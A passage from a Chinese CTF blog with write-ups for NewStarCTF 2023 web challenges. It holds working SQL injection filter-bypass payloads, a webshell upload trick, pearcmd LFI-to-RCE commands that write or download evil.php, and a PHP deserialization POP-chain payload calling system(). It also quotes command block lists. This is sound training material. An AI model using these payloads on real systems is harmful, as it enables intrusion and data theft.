punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011203388.png"></p><h3 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h3><p>本题的本质是SQL注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011213428.png"></p><p>本题需要传的俩个参，先测试下是否能注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011214113.png"></p><p>说明本题是单引号注入，且本题过滤了空格，以及or select union，可以用&#x2F;**&#x2F;来绕过空格，union、or、select则可以通过双写绕过。</p><pre class=" language-sql"><code class="language-sql">获取所有数据库名（information_schema<span class="token punctuation">,</span>users<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>test<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>sys）username<span class="token operator">=</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span>ununionion<span class="token comment" spellcheck="true">/**/</span>sselectelect<span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>infoorrmation_schema<span class="token punctuation">.</span>schemata<span class="token comment" spellcheck="true">#&amp;password=1</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011256060.png"></p><pre class=" language-sql"><code class="language-sql">爆users表名username<span class="token operator">=</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span>uunionnion<span class="token comment" spellcheck="true">/**/</span>sselectelect<span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/**/</span>table_schema<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment" spellcheck="true">#&amp;password=1</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011258407.png"></p><pre class=" language-sql"><code class="language-sql">爆users列名（<span class="token keyword">user</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token keyword">USER</span><span class="token punctuation">,</span>CURRENT_CONNECTIONS<span class="token punctuation">,</span>TOTAL_CONNECTIONS）username<span class="token operator">=</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span>uunionnion<span class="token comment" spellcheck="true">/**/</span>sselectelect<span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/**/</span>table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment" spellcheck="true">#&amp;password=1</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011241830.png"></p><pre class=" language-sql"><code class="language-sql">爆password字段username<span class="token operator">=</span><span class="token number">1</span>'uunionnion<span class="token comment" spellcheck="true">/**/</span>sselectelect<span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">.</span>users<span class="token comment" spellcheck="true">#&amp;password=1</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011259286.png"></p><h3 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*Read /flaggggggg.txt*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//strings</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"想读我文件？大胆。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\^|\||\~|\\$|\%|jay/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"无字母数字RCE？大胆！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/bash|nc|curl|sess|\{|:|;/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"奇技淫巧？大胆！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/fl|ag|\.|x/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"大胆！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>四个if判断过滤了很多用于rce的东西，不过assert()函数等效于eval()函数，且过滤未过滤system，我们也可以通过通配符来绕过。所以构造payload</p><pre><code>code=printf(`c\at /f*`)%0a</code></pre><p>因为;在第三个判断就被过滤了，所以需要绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011310573.png"></p><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h3><p>本题需要上传.user.ini文件来进行上传绕过，然后在UA头放上一句话木马以此来拿到flag</p><p>先上传一个.user.ini文件并且修改UA头</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011333946.png"></p><p>然后通过蚁剑连接在根目录下拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011335642.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手，WEB，MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023NewStarCTF-Week3-部分WP</title>
      <link href="/2023/11/11/2023NewStarCTF-Week3-%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/11/11/2023NewStarCTF-Week3-%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h3><p>提示为<code>LFI TO RCE</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    \# Something in phpinfo<span class="token punctuation">.</span>php<span class="token operator">!</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>在该代码中，过滤了太多常规情况下用于文件读取的php伪协议操作。</p><pre><code>1 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流（I/O streams）5 zlib:// — 压缩流6 data:// — 数据（RFC 2397）7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流</code></pre><p>不过在其中我们可以通过<code>file://</code>来读取以下phpinfo.php，看看里面有什么东西，构造为</p><pre><code>GET: file=file:///var/www/html/phpinfo </code></pre><p>搜索关键值<code>flag</code>找到提示信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403221955653.png"></p><p>让我们去检查<code>register_argc_argv</code>，那我们通过搜索去看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403221955696.png"></p><p>发现其处于打开状态，通过上网搜索学习[register_argc_argv与include to RCE的巧妙组合 - Longlone’s Blog](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;)通过该佬所言，其是与<code>pear</code>有关，</p><pre><code>//通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义// config-create可以直接创建配置文件，且第一个参数必须以/开头http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php// 通过远程直接下载webshell// web目录可写- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php- http://ip:port/tmp/pear/download/evil.php  // tmp目录可写- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php- http://ip:port/include.php?f=/tmp/pear/download/evil</code></pre><p>我们去搜一下这道题有没有这个环境，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403221959232.png"></p><p>然后这是pearcmd.php的存放位置</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222002864.png"></p><p>这下要素齐全了，可以开整，所以我们可以构造</p><pre><code>GET: file=/usr/local/lib/php/pearcmd&amp;+config-create+/var/www/html/&lt;?=`$_POST[shell]`;?&gt;+1.php</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222011068.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222011566.png"></p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>这题是拿sqlmap一把梭出来的</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222027010.png"></p><p>可以爆出数据库是<code>ctf</code>，然后从库中可以得到目标表<code>here_is_flag</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222027457.png"></p><p>继续爆破，可以拿到列<code>flag</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222028365.png"></p><p>最后去爆出<code>flag</code>中的字段</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222029679.png"></p><h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Begin</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Then</span><span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"Good Job!"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Handle</span><span class="token punctuation">{</span>  <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Super</span><span class="token punctuation">{</span>  <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CTF</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>一眼顶针，鉴定为<code>pop链反序列化题</code>，所以对此我们需要进行构造，从而构造出可以进行命令执行的字段。</p><pre><code>__construct()– 在创建对象时调用，用于初始化对象的属性和方法。__destruct() – 在对象销毁时调用，用于释放资源和清理操作。__call(args) – 在调用一个不存在的方法时触发。__callStatic(args) – 在调用一个不存在的静态方法时触发。__get($name) – 在访问一个不存在的属性时触发。__set(value) – 在给一个不存在的属性赋值时触发。给私有属性，受保护属性赋值也能触发。__isset($name) – 在判断一个不存在的属性是否存在时触发。__unset($name) – 在销毁一个不存在的属性时触发。__sleep() – 在序列化一个对象时触发。__wakeup() – 在反序列化一个对象时触发。__toString() – 在将对象转换为字符串时触发。echo,print,die,preg_match,strtolower等函数操作对象时触发，还有弱比较 == 也能触发。__invoke($args) – 在将对象作为函数调用时触发。__set_state($properties) – 在使用var_export()导出类时触发。__clone() – 在将对象复制时触发。__debugInfo() – 在使用var_dump()函数打印对象时触发。</code></pre><p>可以看到我们最终执行命令的地方是在<code>WhiteGod</code>这个类里面，首先我们的pop链是从<code>Begin类</code>开始，通过<code>Begin类</code>触发<code>Then类</code>的<code>tostring()</code>方法，接着<code>tostring()</code>又触发<code>Super类</code>中的<code>invoke()</code>方法，在<code>invoke()</code>方法中调用了一个不存在的方法<code>getStr()</code>,所以又触发了<code>Handle类</code>中的<code>call()</code>方法，然后将其指向<code>CTF类</code>中的<code>end()</code>函数，从而避免在<code>Handle类</code>触发die函数，最后在<code>CTF类</code>中销毁一个不存在的属性<code>log</code>时触发<code>WhiteGod类</code>中的<code>unset()</code>方法，至此，我们达成了我们实现命令执行的目的。</p><pre><code>Begin() -&gt; Then() -&gt; Super() -&gt; Handle() -&gt; CTF() -&gt; WhiteGod()</code></pre><p>所以我们可以构造payload()</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Begin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Then</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Good Job!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Handle</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//从而确保触发的是CTF中的end()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Super</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CTF</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string">"ls /"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>由于里面有些属性是<code>private</code>、<code>protected</code>，所以我们只能通过一些方式去访问到，且不知道为什么我用urlencode后无法得到正确的回显，所以需要自己手操一下，即在结果里有空格的地方进行%00截断一下。</p><pre><code>POST: pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222142021.png"></p><pre><code>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222145621.png"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">minipop</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span 